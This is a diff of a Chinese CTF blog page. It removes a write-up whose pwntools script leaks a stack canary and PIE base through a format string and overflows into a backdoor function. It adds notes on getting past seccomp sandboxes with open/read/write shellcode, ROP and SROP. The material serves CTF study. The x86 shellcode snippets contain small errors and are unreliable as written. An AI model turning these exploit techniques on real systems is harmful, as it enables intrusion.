@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2024.2.9, Hexo">
-    <meta name="description" content="ff开了pie和canary的一道题，还有格式化字符串漏洞，用格式化字符串找到canary，然后利用当前程序的地址算出基址破解pie
-先计算字符串的偏移，一般canary的后两位是00，算出canary的偏移在17,下一个程序在后两个，第1">
+    <meta name="keywords" content="orw笔记(持续更新), Hexo">
+    <meta name="description" content="orw介绍orw禁用了系统调用，采用了沙箱技术开启了沙箱保护，我们不能正常的get shell，只能用ROP链来调用其他的函数，这时候需要通过调用open、read、write这样的函数打开flag
+沙箱函数原始的沙箱都是使用prctl()">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2024.2.9 | Hexo</title>
+    <title>orw笔记(持续更新) | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -337,12 +337,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2024.2.9</h1>
+                    <h1 class="description center-align post-title">orw笔记(持续更新)</h1>
                 </div>
             </div>
         </div>
@@ -387,7 +387,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    188
+                    761
                 </div>
                 
 
@@ -404,20 +404,33 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h1><p>开了pie和canary的一道题，还有格式化字符串漏洞，用格式化字符串找到canary，然后利用当前程序的地址算出基址破解pie</p>
-<p>先计算字符串的偏移，一般canary的后两位是00，算出canary的偏移在17,下一个程序在后两个，第19</p>
-<p><img src="/2024/02/21/2024-2-9/ff.1.png"></p>
-<p>因为要计算基址，先找到第19位程序的后四位地址再计算</p>
-<p><img src="/2024/02/21/2024-2-9/ff.2.png"></p>
-<p>然后找到后门函数位置</p>
-<p><img src="/2024/02/21/2024-2-9/ff.3.png"></p>
-<p>找到canary的偏移</p>
-<p><img src="/2024/02/21/2024-2-9/ff.4.png"></p>
-<p>exp:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="amd64", log_level="debug")</span><br><span class="line"></span><br><span class="line">p = process("./ff")</span><br><span class="line"></span><br><span class="line">p.sendline(b"%17$p-%19$p")</span><br><span class="line"></span><br><span class="line">p.recvuntil("0x")</span><br><span class="line"></span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line"></span><br><span class="line">ret = int(p.recv(15)[3:],16)</span><br><span class="line"></span><br><span class="line">base = ret - 0x146F</span><br><span class="line"></span><br><span class="line">cat = base + 0x1231</span><br><span class="line"></span><br><span class="line">payload = b'a' * 56 + p64(canary) + p64(0) + p64(cat)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+                <h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>orw禁用了系统调用，采用了沙箱技术开启了沙箱保护，我们不能正常的get shell，只能用ROP链来调用其他的函数，这时候需要通过调用open、read、write这样的函数打开flag</p>
+<h2 id="沙箱函数"><a href="#沙箱函数" class="headerlink" title="沙箱函数"></a>沙箱函数</h2><p>原始的沙箱都是使用prctl()函数进行,所以能看见这个函数的时候一般都有开了沙箱</p>
+<p><code>**prctl** ( int **option**,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )</code></p>
+<h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>可以通过<code>seccomp-tools</code>来判断是否添加沙箱，以及查看沙箱的规则</p>
+<h3 id="seccomp-tools的安装"><a href="#seccomp-tools的安装" class="headerlink" title="seccomp-tools的安装"></a>seccomp-tools的安装</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install gcc ruby-dev</span><br><span class="line">$ gem install seccomp-tools</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/2024/02/21/2024-2-9/ff.5.png"></p>
-<p>(因为没自己写flag所以cat不到)</p>
+<h2 id="seccomp-tools的使用"><a href="#seccomp-tools的使用" class="headerlink" title="seccomp-tools的使用"></a>seccomp-tools的使用</h2><p><code>seccomp-tools dump ./pwn</code></p>
+<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h2><p>一般来说，orw这种类型的题都会有一个mmap函数来改写一个地址的读写权限，我们需要利用这块地址来构造ROP链。</p>
+<p><code>void *mmap (void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p>
+<h2 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>没有开启NX保护的时候，可以让程序执行自己输入的指令直接调用orw三个系统调用(x86下的shellcode,x64需要修改一下寄存器)</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#fd = open('/home/orw/flag',0) </span><br><span class="line">s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''</span><br><span class="line"></span><br><span class="line">#read(fd,0x804a094,0x20) </span><br><span class="line">s = ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''</span><br><span class="line"></span><br><span class="line">#write(1,0x804a094,0x20) </span><br><span class="line">s = ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>开启NX保护的题目，无法执行shellcode，需要通过ROP来调用orw的三个函数</p>
+<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
+<p><img src="/2024/02/21/orw/SROP%E4%BF%A1%E5%8F%B7.png"></p>
+<p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p>
+<p>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。</p>
+<p>需要注意的是，这一部分是在用户进程的地址空间的。</p>
+<p>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p>
+<p>我的理解是，触发信号之后会进入内核然后寄存器压栈，然后准备sigreturn的调用。</p>
+<p><img src="/2024/02/21/orw/SROP%E6%A0%88%E7%BB%93%E6%9E%84.png"></p>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>如果我们伪造栈上的进程上下文再直接调用sigreturn系统调用，就能通过伪造的进程上下文中的各种寄存器随意设置寄存器、跳转任意地址</p>
+<h2 id="利用set-context"><a href="#利用set-context" class="headerlink" title="利用set_context"></a>利用set_context</h2><p>(下面还没学，学完之后更新)</p>
+<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>禁用free_hook则打malloc_hook</p>
+<h2 id="House-of-KIWI"><a href="#House-of-KIWI" class="headerlink" title="House of KIWI"></a>House of KIWI</h2><p>参考博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fuxuqiannian/p/17144953.html">https://www.cnblogs.com/fuxuqiannian/p/17144953.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/">https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_2">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_2</a></p>
 
                 
             </div>
@@ -444,7 +457,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://j1ton9.github.io/2024/02/21/2024-2-9/">https://j1ton9.github.io/2024/02/21/2024-2-9/</a>
+                    <a href="https://j1ton9.github.io/2024/02/21/orw/">https://j1ton9.github.io/2024/02/21/orw/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -557,7 +570,7 @@
         repo: '',
         owner: '',
         admin: null,
-        id: '2024-02-21T16-08-31',
+        id: '2024-02-21T16-41-32',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -581,7 +594,7 @@
 <script src="/libs/gitment/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-    id: 'Wed Feb 21 2024 16:08:31 GMT+0800',
+    id: 'Wed Feb 21 2024 16:41:32 GMT+0800',
     owner: '',
     repo: '',
     oauth: {
@@ -606,9 +619,9 @@ gitment.render('gitment-content');
 
 <script type="text/javascript">
     disqus_config = function () {
-        this.page.url = 'https://j1ton9.github.io/2024/02/21/2024-2-9/';
-        this.page.identifier = '/2024/02/21/2024-2-9/';
-        this.page.title = '2024.2.9';
+        this.page.url = 'https://j1ton9.github.io/2024/02/21/orw/';
+        this.page.identifier = '/2024/02/21/orw/';
+        this.page.title = 'orw笔记(持续更新)';
     };
     let disqus_shortname = '';
 
@@ -660,9 +673,10 @@ gitment.render('gitment-content');
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2024/02/21/orw/">
                     <div class="card-image">
@@ -680,9 +694,9 @@ gitment.render('gitment-content');
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-02-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-02-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -691,6 +705,7 @@ gitment.render('gitment-content');
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -701,13 +716,13 @@ gitment.render('gitment-content');
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/02/06/week%202/">
+                <a href="/2024/02/21/2024-2-9/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Week 2">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="2024.2.9">
                         
-                        <span class="card-title">Week 2</span>
+                        <span class="card-title">2024.2.9</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -718,7 +733,7 @@ gitment.render('gitment-content');
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-02-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-02-21
                             </span>
                         <span class="publish-author">
                             
